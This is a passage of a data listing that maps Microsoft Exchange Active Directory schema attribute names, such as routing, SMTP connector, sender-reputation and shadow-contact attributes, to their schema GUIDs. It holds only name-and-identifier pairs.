        "msExchRoutingAcceptMessageType" = "881759de-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRoutingDisallowPriority" = "909a7f32-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRoutingDisplaySenderEnabled" = "88dadab2-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRoutingEnabled" = "89f1cdd4-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRoutingETRNDomains" = "62a383c0-2d9d-11d3-aa6b-00c04f8eedd8";
        "msExchRoutingGroup" = "35154156-a982-11d2-a9ff-00c04f8eedd8";
        "msExchRoutingGroupConnector" = "899e5b86-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRoutingGroupContainer" = "34de6b40-a982-11d2-a9ff-00c04f8eedd8";
        "msExchRoutingGroupMembersBL" = "fa9635c0-4acb-47de-ad00-1880b590481b";
        "msExchRoutingGroupMembersDN" = "1ff9ed9a-b098-11d2-aa06-00c04f8eedd8";
        "msExchRoutingMasterDN" = "2024d7ee-b098-11d2-aa06-00c04f8eedd8";
        "msExchRoutingOversizedSchedule" = "88f51490-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRoutingOversizedStyle" = "89141322-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRoutingSMTPConnector" = "89baf7be-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRoutingTriggeredSchedule" = "892e4d00-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRoutingTriggeredStyle" = "894ae938-b09e-11d2-aa06-00c04f8eedd8";
        "msExchRpcHttpFlags" = "4ed4e88c-175b-4c5b-ab6d-0e86bc87a24c";
        "msExchRpcHttpVirtualDirectory" = "a5783da9-38f0-4f51-8ed7-d5bd9bfb0fde";
        "msExchSafeRecipientsHash" = "6f606079-3a82-4c1b-8efb-dcc8c91d26fe";
        "msExchSafeSendersHash" = "7cb4c7d3-8787-42b0-b438-3c5d479ad31e";
        "msExchSaslLogonDomain" = "209c0d82-b098-11d2-aa06-00c04f8eedd8";
        "msExchSASLMechanisms" = "d93571b4-c99a-4cfc-aaba-2d809fd68e79";
        "msExchSchedPlusAGOnly" = "b1fce956-1d44-11d3-aa5e-00c04f8eedd8";
        "msExchSchedPlusFullUpdate" = "b1fce950-1d44-11d3-aa5e-00c04f8eedd8";
        "msExchSchedPlusSchedist" = "b1fce94c-1d44-11d3-aa5e-00c04f8eedd8";
        "msExchSchedulePlusConnector" = "b1fce946-1d44-11d3-aa5e-00c04f8eedd8";
        "msExchSchemaMapPolicy" = "348af8f2-a982-11d2-a9ff-00c04f8eedd8";
        "msExchSchemaPolicyConsumers" = "20c6f7d6-b098-11d2-aa06-00c04f8eedd8";
        "msExchSchemaVersionAdc" = "60735c93-c60e-405e-b5ea-cb31f68ad548";
        "msExchSchemaVersionPt" = "5f8198d5-e7c9-4560-b166-08dc7cfc17c1";
        "msExchScope" = "ef339a27-be18-41ca-8436-194716ab7e34";
        "msExchScopeFlags" = "f9ac0cf7-a7e9-435c-8a8d-6c294a5aa1ab";
        "msExchScopeMask" = "20fb6b92-b098-11d2-aa06-00c04f8eedd8";
        "msExchScopeRoot" = "e31a668f-1f2d-4314-965b-7fe590515f77";
        "msExchSearchBase" = "1884a3fe-efcb-47b0-bbd4-a91ef8cd4cb4";
        "msExchSearchScope" = "05ed1e50-31c8-4ed2-b01e-732dbf6dd344";
        "msExchSecureBindings" = "216ddc72-b098-11d2-aa06-00c04f8eedd8";
        "msExchSecurityPassword" = "b8d47e4e-4b78-11d3-aa75-00c04f8eedd8";
        "msExchSendAsAddresses" = "b9868c4a-8e94-4c96-8e58-c8c84615be92";
        "msExchSendEncryptedPassword" = "981a8e4c-cd98-478b-9d01-f776e0de58c8";
        "msExchSenderHintConfig" = "ee1a0b43-0e30-4455-abc5-8b6e2d48e244";
        "msExchSenderHintLargeAudienceThreshold" = "01b8ec5a-c8a3-4093-aadf-844c38a7abc5";
        "msExchSenderHintsEnabled" = "56192384-ff37-45d4-abed-81eeafed8681";
        "msExchSenderHintTranslations" = "949e6a9d-243c-45be-af10-f7f26858b229";
        "msExchSenderReputation" = "66a31681-cf58-41a8-a725-8361b9e806be";
        "msExchSenderReputationCiscoPorts" = "ce0d9f0c-aca3-4bc2-88ba-ebb4a3def1a9";
        "msExchSenderReputationHttpConnectPorts" = "4b642a37-36ef-49e7-abfb-29eecb9d6888";
        "msExchSenderReputationHttpPostPorts" = "b27a8520-d7a4-4d00-aa05-4032e6cbbd7a";
        "msExchSenderReputationMaxDownloadInterval" = "e6a94062-2af9-4c43-866c-cd86f692c7eb";
        "msExchSenderReputationMaxIdleTime" = "27dd2f0e-ac0a-442f-993a-a647a9f98d67";
        "msExchSenderReputationMaxPendingOperations" = "e822c0bb-1db3-432a-a1b9-09151fac77d0";
        "msExchSenderReputationMaxWorkQueueSize" = "5986cdf7-8b93-4c8d-bfca-bbffe2f9c283";
        "msExchSenderReputationMinDownloadInterval" = "c532822b-8e3a-4ac9-9e78-ee029003f627";
        "msExchSenderReputationMinMessagePerTimeSlice" = "317373e0-0f2b-413f-bbd3-818ce50a111f";
        "msExchSenderReputationMinMessagesPerDatabaseTransaction" = "a44dd6b7-8784-40e9-b229-7018b1a44cd4";
        "msExchSenderReputationMinReverseDnsQueryPeriod" = "8b439b94-98b7-418f-8e21-30b0f702ec0e";
        "msExchSenderReputationOpenProxyFlags" = "6345a722-83fa-41fe-94a1-8ece707f59e6";
        "msExchSenderReputationOpenProxyRescanInterval" = "95bbd180-c5b0-4dcc-b443-2d8307ddd199";
        "msExchSenderReputationProxyServerIP" = "7f804a06-674b-4951-b0ba-3bf8df129cbb";
        "msExchSenderReputationProxyServerPort" = "01fab06c-c8fe-4e8d-a53b-5e46236f77b3";
        "msExchSenderReputationProxyServerType" = "81cf7add-09d4-4683-a25b-6d29aa66eadc";
        "msExchSenderReputationSenderBlockingPeriod" = "9d2af688-c79e-4637-9cfe-e2f740a148b3";
        "msExchSenderReputationServiceUrl" = "84b294cd-1782-4061-8d63-f04f2d163991";
        "msExchSenderReputationSocks4Ports" = "321358a4-70b1-4269-8336-f6ac6f6fdc5a";
        "msExchSenderReputationSocks5Ports" = "58635c3f-b2e8-494f-a996-4e0fd303c14e";
        "msExchSenderReputationSrlBlockThreshold" = "a2875b38-1404-4cbb-be50-022fe213be16";
        "msExchSenderReputationSrlSettingsDatabaseFileName" = "0071cad5-a0a3-4c7c-8330-367e1c5e68a1";
        "msExchSenderReputationTablePurgeInterval" = "e7a33e12-80c7-4fee-9a4c-35878a66b3d6";
        "msExchSenderReputationTelnetPorts" = "c9f1922c-2fb6-4b11-add2-2f1a338da9e2";
        "msExchSenderReputationTimeSliceInterval" = "1f2a73d0-ce75-4fd7-8f7e-6da61f5afc7e";
        "msExchSenderReputationWingatePorts" = "1f3b047f-6330-4ace-8552-ff1df5c47077";
        "msExchSendUserName" = "43c52481-084b-4546-a896-69c94199abd5";
        "msExchServer1AlwaysCreateAs" = "222efaec-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1AuthenticationCredentials" = "225ea9f4-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1AuthenticationPassword" = "228bf6a2-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1AuthenticationType" = "22b94350-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1DeletionOption" = "22edb70c-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1ExportContainers" = "231b03ba-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1Flags" = "234d151c-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1HighestUSN" = "237f267e-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1HighestUSNVector" = "7fb58cd4-2a6e-11d3-aa6b-00c04f8eedd8";
        "msExchServer1ImportContainer" = "23aed586-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1IsBridgehead" = "90b71b6a-b09e-11d2-aa06-00c04f8eedd8";
        "msExchServer1LastUpdateTime" = "23e34942-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1NetworkAddress" = "2412f84a-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1NTAccountDomain" = "2449ce60-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1ObjectMatch" = "247bdfc2-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1PageSize" = "24b0537e-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1Port" = "24e264e0-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1SchemaMap" = "25193af6-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1SearchFilter" = "254daeb2-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1SSLPort" = "258484c8-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer1Type" = "25bb5ade-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2AlwaysCreateAs" = "25f95802-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2AuthenticationCredentials" = "26329072-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2AuthenticationPassword" = "266bc8e2-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2AuthenticationType" = "26a50152-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2DeletionOption" = "26e09c1c-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2ExportContainers" = "27cca4ea-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2Flags" = "28083fb4-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2HighestUSN" = "283a5116-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2HighestUSNVector" = "7fb58cda-2a6e-11d3-aa6b-00c04f8eedd8";
        "msExchServer2ImportContainer" = "286c6278-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2IsBridgehead" = "90d619fc-b09e-11d2-aa06-00c04f8eedd8";
        "msExchServer2LastUpdateTime" = "28a3388e-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2NetworkAddress" = "28d549f0-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2NTAccountDomain" = "2909bdac-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2ObjectMatch" = "293e3168-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2PageSize" = "296de070-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2Port" = "29a4b686-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2SchemaMap" = "29d6c7e8-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2SearchFilter" = "2a0b3ba4-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2SSLPort" = "2a3faf60-b098-11d2-aa06-00c04f8eedd8";
        "msExchServer2Type" = "2a74231c-b098-11d2-aa06-00c04f8eedd8";
        "msExchServerAdminDelegationBL" = "23d29f88-7feb-4a18-b11e-7c226ff04ad6";
        "msExchServerAdminDelegationLink" = "cca785f2-a896-4aed-b26a-8892de4b7a3c";
        "msExchServerAssociationBL" = "bc117a1e-610f-4652-8ab4-a7e781849c0e";
        "msExchServerAssociationLink" = "b559ff33-d786-40e9-bb81-b40d984fcdaf";
        "msExchServerAutoStart" = "21cf9cdc-b098-11d2-aa06-00c04f8eedd8";
        "msExchServerBindings" = "2201ae3e-b098-11d2-aa06-00c04f8eedd8";
        "msExchServerBindingsFiltering" = "61aedffa-34b4-4170-8bab-b8794e1cb4f4";
        "msExchServerBindingsTurflist" = "0b836d98-3b20-11d3-aa6f-00c04f8eedd8";
        "msExchServerEKPKPublicKey" = "5ec119e9-9690-44e7-afbd-057e2b0c0f84";
        "msExchServerEncryptedKPK" = "9a3adfce-b077-4a97-8a7f-8cd2a4d0cdf6";
        "msExchServerGlobalGroups" = "419f00f6-fb22-4ea9-8113-ed928767baa5";
        "msExchServerGroups" = "5fd75fb9-3819-4d25-b18e-7bce391d4767";
        "msExchServerInternalTLSCert" = "d0ad315b-0a1d-42e3-b93c-47b119c2d59a";
        "msExchServerLocalGroups" = "924a0b14-ea4f-4627-abd1-adbc801c4b0b";
        "msExchServerPublicKey" = "b83df2df-c304-4563-90fd-d38ec81b04cb";
        "msExchServerRedundantMachines" = "8945707b-7938-48fc-9b23-8af91d47a193";
        "msExchServerRole" = "8c8fc29e-b09e-11d2-aa06-00c04f8eedd8";
        "msExchServersContainer" = "346e5cba-a982-11d2-a9ff-00c04f8eedd8";
        "msExchServerSite" = "85ca67b3-a515-41bf-b78f-c32a69a000f6";
        "msExchServerSiteBL" = "9da33129-063c-40c8-9603-89ab947e51f7";
        "msExchServicePlan" = "072bdf9d-5a0a-4a61-8544-40c406ec5f19";
        "msExchSetupStatus" = "69c11cba-2499-42bb-994d-602055527876";
        "msExchSetupTime" = "50db4eba-f94d-4b80-b46b-ddaff72f7476";
        "msExchShadowAssistantName" = "e806f885-4bc8-4be3-a836-b3c05f291dcf";
        "msExchShadowC" = "aaae8ba6-8a9c-43e0-9afa-3eae46fd9c3b";
        "msExchShadowCo" = "f597d80d-332c-4f7e-b3be-94b45879793a";
        "msExchShadowCompany" = "df7f9904-27ab-45f6-b36d-94ad101ec11d";
        "msExchShadowCountryCode" = "61d57224-aea8-43d5-93e9-7df1b71f6cb6";
        "msExchShadowDepartment" = "23eedeab-a4b7-4448-9725-22c0dfb7ad0d";
        "msExchShadowDisplayName" = "2aaa2a91-25f6-40d3-9029-1fbabfa78c7c";
        "msExchShadowFacsimileTelephoneNumber" = "09b8f0ff-1b9d-42c1-aaeb-d64aeda58310";
        "msExchShadowGivenName" = "3fc61a9c-314a-4d7a-969b-d84c5028a4da";
        "msExchShadowHomePhone" = "c694ef46-c8e7-4eca-87ba-8ae41060c29c";
        "msExchShadowInfo" = "72a39ed8-7649-494e-8a9d-23d5ccc375c9";
        "msExchShadowInitials" = "9d8da456-ce41-4ac9-8d3b-05ea4b4bfc5c";
        "msExchShadowL" = "e6dd5bd8-0537-47e1-b6e2-404c53fef738";
        "msExchShadowMailNickname" = "1d9541c4-e8c4-4890-9f18-36771c76fc59";
        "msExchShadowManagerLink" = "a341a6b8-c021-4f42-aab2-4f282f6d6b23";
        "msExchShadowMobile" = "bd4281f3-9b4a-4a6c-aa69-86be69874123";
        "msExchShadowOtherFacsimileTelephone" = "0177f09d-58b5-4153-b208-c482392b04e1";
        "msExchShadowOtherHomePhone" = "e322c437-aa9f-4fd2-885b-095c156cfcd1";
        "msExchShadowOtherTelephone" = "ac8652c2-b77d-4fb2-843d-51c155a7a54d";
        "msExchShadowPager" = "0bb8573d-155d-40f6-ab01-f294062453a1";
        "msExchShadowPhysicalDeliveryOfficeName" = "b7f97626-be12-4fff-9124-0e3558153fc8";
        "msExchShadowPostalCode" = "efa2b95a-6d55-460d-8bb0-44791bc513dd";
        "msExchShadowProxyAddresses" = "e6281995-41e9-481d-a179-5a14337cbb00";
        "msExchShadowSn" = "742314c1-733e-4d1b-b22c-edea3cbe7bc7";
        "msExchShadowSt" = "20168714-144f-4cb2-a298-094ffdbaa006";
        "msExchShadowStreetAddress" = "633160b2-988f-4e88-9d0f-228f080c9295";
        "msExchShadowTelephoneAssistant" = "7557bd73-3665-47a7-8a35-cf9634b77ac9";
        "msExchShadowTelephoneNumber" = "97bfc26e-bb38-4662-8f35-e0ddcd6a0f38";
        "msExchShadowTitle" = "1bfbc4c6-3789-424e-b111-77b554ac4376";
        "msExchShadowWindowsLiveID" = "590c3adb-4ee4-47a0-982a-7e01e81ce59c";
        "msExchShadowWWWHomePage" = "3b79ac80-5f4f-4ee1-9d78-3c580d81e0fa";
        "msExchSharedConfigBL" = "9b68c4d1-f10b-4514-ba5a-aeb486ad0a99";
        "msExchSharedConfigLink" = "68add4db-47dd-4b52-be5e-521ae25c9350";
        "msExchSharedConfigServicePlanTag" = "09f7c144-0ebc-49b4-a926-95de27f3eabd";
        "msExchSharedIdentityServerBoxRAC" = "707c1dac-a794-4e11-bd41-728ce37e3211";
        "msExchSharingAnonymousIdentities" = "53454c37-64bd-4849-a5f4-b5d049656726";
        "msExchSharingDefaultPolicyLink" = "b40255e9-20f7-43a6-999d-75128c4ce26f";
        "msExchSharingPartnerIdentities" = "ec3eb9f0-afc7-436e-9a04-3fb85f357cdb";
        "msExchSharingPolicy" = "d7cf53c4-7313-49c1-88cd-9db9bf729720";
        "msExchSharingPolicyDomains" = "e78e9292-ce10-41a4-949f-57e51d7273bc";
        "msExchSharingPolicyIsEnabled" = "50bad094-d14a-4b5a-ae4d-a3fc21ebc32a";
        "msExchSharingPolicyLink" = "718c1434-373e-4236-95b3-7cac66d6d9e3";
        "msExchSharingRelationshipForExternalOrganizationEmail" = "72b4dad2-b0f7-40c8-adf9-3fc7afa0cf78";
        "msExchSignupAddresses" = "4f81887b-cefa-482e-9d41-f49338624fcf";
        "msExchSignupAddressesEnabled" = "6a2b4ea2-bfb8-4a27-888f-92419a0e0d28";
        "msExchSIPAccessService" = "1b2c269f-0e93-47ea-af4a-911ce754ff5c";
        "msExchSIPSBCService" = "657eca3b-af69-4df7-8809-1ff85d084c7c";
        "msExchSiteReplicationService" = "99f5867b-12e8-11d3-aa58-00c04f8eedd8";
        "msExchSLVFile" = "2aaaf932-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpAuthorizedTRNAccounts" = "2b164304-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpBadMailDirectory" = "2b5904dc-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpConnectionRulesPriority" = "86c24f8c-259b-4f19-88b9-9c9445936121";
        "msExchSmtpConnectionTurfList" = "7eea7de9-319e-408a-8460-e35e2c9da389";
        "msExchSmtpConnectionTurfListDisplay" = "73fb04ac-b2d4-4a4d-8520-757dd3c9261a";
        "msExchSmtpConnectionTurfListDNS" = "3fee7de6-d3e5-43cb-8459-f7a072ae3789";
        "msExchSmtpConnectionTurfListMask" = "bc0241af-9d38-4c40-842e-51d802506de5";
        "msExchSmtpConnectionTurfListOptions" = "5ae62360-1105-4d8b-8a1e-a2c793b4d57d";
        "msExchSmtpConnectionTurfListResponse" = "eeddd98f-da01-4ecb-a65e-5f016f1d8032";
        "msExchSmtpConnectionTurfListRule" = "6abadfad-e2f6-4ddb-9820-0da9c47da32c";
        "msExchSmtpConnectionWhitelist" = "87cf463a-561e-45ce-a0ba-6d528f111d23";
        "msExchSmtpDomainString" = "2bd03a70-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpDoMasquerade" = "2b949fa6-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpDropDirectory" = "2c260f18-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpDsDataDirectory" = "2c6d95a4-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpDsDefaultMailRoot" = "2cadf522-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpDsDomain" = "2ce72d92-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpDsFlags" = "2d206602-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpDsHost" = "2d599e72-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpDsPort" = "2d92d6e2-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpEnableEXPN" = "e24d7a86-439d-11d3-aa72-00c04f8eedd8";
        "msExchSmtpEnableLdapRouting" = "2dce71ac-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpEnableVRFY" = "e24d7a80-439d-11d3-aa72-00c04f8eedd8";
        "msExchSMTPExtendedProtectionPolicy" = "bc03f4bf-1d44-4d41-8f01-0fdad5f88a62";
        "msExchSmtpExternalDNSServers" = "a1826432-f85e-42b6-b55d-1249ed2f78a3";
        "msExchSmtpFullyQualifiedDomainName" = "2e0547c2-b098-11d2-aa06-00c04f8eedd8";
        "msExchSMTPGlobalIPAcceptList" = "752cd028-a935-40aa-8f8b-14aeb4433c93";
        "msExchSMTPGlobalIPDenyList" = "61e731dc-484d-4566-8aac-c54747f13cc4";
        "msExchSmtpInboundCommandSupportOptions" = "2e40e28c-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpLdapAccount" = "2e7c7d56-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpLdapBindType" = "2ebcdcd4-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpLdapNamingContext" = "2ef61544-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpLdapPassword" = "2f2f4db4-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpLdapSchemaType" = "2f688624-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpLocalQueueDelayNotification" = "2f9f5c3a-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpLocalQueueExpirationTimeout" = "40bd7e66-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpMasqueradeDomain" = "40eacb14-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpMaxHopCount" = "411817c2-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpMaxMessageSize" = "4147c6ca-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpMaxMessagesPerConnection" = "6621b63b-03a1-42cf-b794-03c2fe286ba4";
        "msExchSmtpMaxOutboundMsgPerDomain" = "417775d2-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpMaxOutboundMsgPerDomainFlag" = "41a724da-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpMaxOutgoingConnections" = "41d9363c-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpMaxOutgoingConnectionsPerDomain" = "420b479e-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpMaxRecipients" = "423af6a6-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpMaxSessionSize" = "426aa5ae-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpOutboundSecurityFlag" = "429cb710-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpOutboundSecurityPassword" = "42edc704-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpOutboundSecurityUserName" = "43249d1a-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpOutgoingConnectionTimeout" = "436037e4-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpOutgoingPort" = "43b3aa32-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpOutgoingSecurePort" = "43f1a756-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpPerformReverseDnsLookup" = "441ef404-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpPickupDirectory" = "444054f0-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpQueueDirectory" = "4468dcea-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpReceiveAdvertisedDomain" = "e9f81bb3-3593-438e-8a4f-ed2842adff97";
        "msExchSmtpReceiveBanner" = "5367b285-3ac0-46ac-a945-0ac1fa9c28a7";
        "msExchSmtpReceiveBindings" = "6408dc1d-d8a3-4168-aa75-816f3e9ac211";
        "msExchSmtpReceiveConnectionInactivityTimeout" = "ead1293a-cc71-450b-a882-436c8dbd8f24";
        "msExchSmtpReceiveConnectionTimeout" = "65bd296d-50bd-41c8-98c8-84ee6dfc1a48";
        "msExchSmtpReceiveConnector" = "44601346-776a-46e7-b4a4-2472e1c66806";
        "msExchSMTPReceiveConnectorFQDN" = "88b5e259-a18f-4202-adc3-cd24a603b266";
        "msExchSMTPReceiveDefaultAcceptedDomainBL" = "9c30fe1f-1cac-438d-9c4a-f4aa5796e04c";
        "msExchSMTPReceiveDefaultAcceptedDomainLink" = "21009fbe-e727-4e41-8952-c9c80f3dd3ab";
        "msExchSmtpReceiveEnabled" = "f6bf6370-69b6-4707-a1db-5aa160319ac9";
        "msExchSMTPReceiveExternallySecuredAs" = "e995a875-a338-4861-81ee-a55d80d965da";
        "msExchSMTPReceiveInboundSecurityFlag" = "37948e6b-57de-4ecd-a84a-e95795340505";
        "msExchSmtpReceiveMaxAcknowledgementDelay" = "0415da5c-4da2-4ce0-9e6e-807ddd7e09ef";
        "msExchSmtpReceiveMaxConnectionRatePerMinute" = "76a2a0fd-3107-422e-a3d2-d7b503bcb5f6";
        "msExchSmtpReceiveMaxHeaderSize" = "ccc12d3d-2c0a-4300-beb1-7ec35ef1b556";
        "msExchSmtpReceiveMaxHopCount" = "6dbb15a2-f2ac-4bdc-a5de-85be91c77aa5";
        "msExchSmtpReceiveMaxInboundConnections" = "7d517b36-edff-48c6-a5b2-295c8efda784";
        "msExchSMTPReceiveMaxInboundConnectionsPercPerSource" = "6bfa4308-289b-4433-8e91-540567c30c9a";
        "msExchSmtpReceiveMaxInboundConnectionsPerSource" = "683d2c5d-c46b-49a8-93ee-acc5f01af525";
        "msExchSmtpReceiveMaxLocalHopCount" = "30c6a8be-bbc7-4ee7-840d-e931284519f9";
        "msExchSmtpReceiveMaxLogonFailures" = "5de583ff-76b0-4d32-b564-16883abcff87";
        "msExchSmtpReceiveMaxMessageSize" = "bf89c828-3865-4db2-8436-cf256ebd2b6a";
        "msExchSmtpReceiveMaxMessagesPerConnection" = "5606a655-9f98-47d4-99ac-e4249239d5b4";
        "msExchSmtpReceiveMaxProtocolErrors" = "4117e174-61a4-42eb-a919-363a4c543b28";
        "msExchSmtpReceiveMaxRecipientsPerMessage" = "2030b854-af1b-494e-9dc3-100d7fade7b4";
        "msExchSMTPReceiveMessageRateSource" = "22ce62d2-814f-4be1-afab-d6aea9f31d1e";
        "msExchSMTPReceivePostmasterAddress" = "43b1fed4-51cc-45e0-b352-8fcacd3a3fa7";
        "msExchSmtpReceiveProtocolLoggingLevel" = "14a01dc7-e3db-403a-92a5-66b72d8c12ac";
        "msExchSmtpReceiveProtocolOptions" = "75f8e34d-c41a-4d09-a829-38061d0b18c0";
        "msExchSmtpReceiveProtocolRestrictions" = "c4520dcc-c68f-4fe4-85d8-95d25cc6cc4a";
        "msExchSMTPReceiveRelayControl" = "8aa13828-0e1c-49bf-97b3-09670b95f717";
        "msExchSmtpReceiveRemoteIPRanges" = "1e654383-9804-4741-a7de-75f30b63ff0f";
        "msExchSmtpReceiveSecurityDescriptor" = "176a249b-69ce-4a5f-8fc8-4d49448ea305";
        "msExchSmtpReceiveTarpitInterval" = "54bd6b59-8555-4725-ae87-da04f183c6a1";
        "msExchSmtpReceiveTlsCertificateName" = "8560430c-aec4-4624-a5b2-6357fe90d358";
        "msExchSmtpReceiveTlsDomainCapabilities" = "ddd7b6db-7fa5-4a0d-90ee-ce1305ef260a";
        "msExchSmtpReceiveType" = "7ed2782b-1b8a-4764-bdcf-44c06a4f1033";
        "msExchSmtpRelayForAuth" = "449164e4-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpRelayIpList" = "44b5282a-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpRemoteQueueDelayNotification" = "44ddb024-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpRemoteQueueExpirationTimeout" = "4501736a-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpRemoteQueueRetries" = "4527990a-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpRoutingTableType" = "454dbeaa-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpSendAdvertisedDomain" = "e5cc073b-1ffb-4752-ab71-0b592d6b5086";
        "msExchSmtpSendBadmailTo" = "4586f71a-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpSendBindingIPAddress" = "f93b462b-df8c-4fe5-b5a1-b268ce3af5be";
        "msExchSmtpSendConnectionTimeout" = "98f9a09d-8331-48cf-86c2-817cb0f1322a";
        "msExchSMTPSendConnectorFQDN" = "20309cbd-0ae3-4876-9114-5738c65f845c";
        "msExchSmtpSendEnabled" = "70cf2b9d-a9fa-42ac-9ae2-d04f3c95d00e";
        "msExchSMTPSendExternallySecuredAs" = "48cc9078-da0e-405d-abba-1893b4c6ddf8";
        "msExchSmtpSendFlags" = "ea56b1e8-9bfd-49d4-b37d-28a9f441b102";
        "msExchSmtpSendNdrLevel" = "29ea0f5d-e048-496c-8d3e-b2d2908caa4f";
        "msExchSmtpSendNDRTo" = "45bb6ad6-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpSendPort" = "99924333-5dc4-4654-84c1-f9b4344fa97d";
        "msExchSmtpSendProtocolLoggingLevel" = "ce2e338a-9877-4b1d-92b0-6f9fb4934cbf";
        "msExchSmtpSendReceiveConnectorLink" = "c2b70009-7171-4404-b064-ac67b1db5bf0";
        "msExchSmtpSendTlsDomain" = "c6906b04-ed10-447e-b622-71f55fb6808e";
        "msExchSmtpSendType" = "74650e0f-0919-4b24-8e71-34b700aa9fe3";
        "msExchSmtpSmartHost" = "45e19076-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpSmartHostType" = "46008f08-b098-11d2-aa06-00c04f8eedd8";
        "msExchSmtpTRNSmartHost" = "be41789c-2da8-11d3-aa6b-00c04f8eedd8";
        "msExchSMTPTurfList" = "0b836da5-3b20-11d3-aa6f-00c04f8eedd8";
        "msExchSNADSConnector" = "91b17254-b09e-11d2-aa06-00c04f8eedd8";
        "msExchSourceBHAddress" = "203d2f32-b099-11d2-aa06-00c04f8eedd8";
        "msExchSourceBridgeheadServersDN" = "206f4094-b099-11d2-aa06-00c04f8eedd8";
        "msExchStandbyCopyMachines" = "73642506-0282-43eb-a9bd-9dcb129c015d";
        "msExchStartedMailboxServers" = "d1dccc22-9b8b-4422-bb79-a1e47816b177";
        "msExchStoppedMailboxServers" = "e3a11316-87e6-4547-bb50-aed7ab3969fa";
        "msExchStorageGroup" = "3435244a-a982-11d2-a9ff-00c04f8eedd8";
        "msExchSubmitRelaySD" = "e2cefbcc-dcc1-45a5-bab8-d5f4bd78884d";
        "msExchSupervisionDLBL" = "efb785d7-38d2-4120-82c4-376e2e4bb7af";
        "msExchSupervisionDLLink" = "76c93ca3-6670-4568-b8a8-0aecb08d4225";
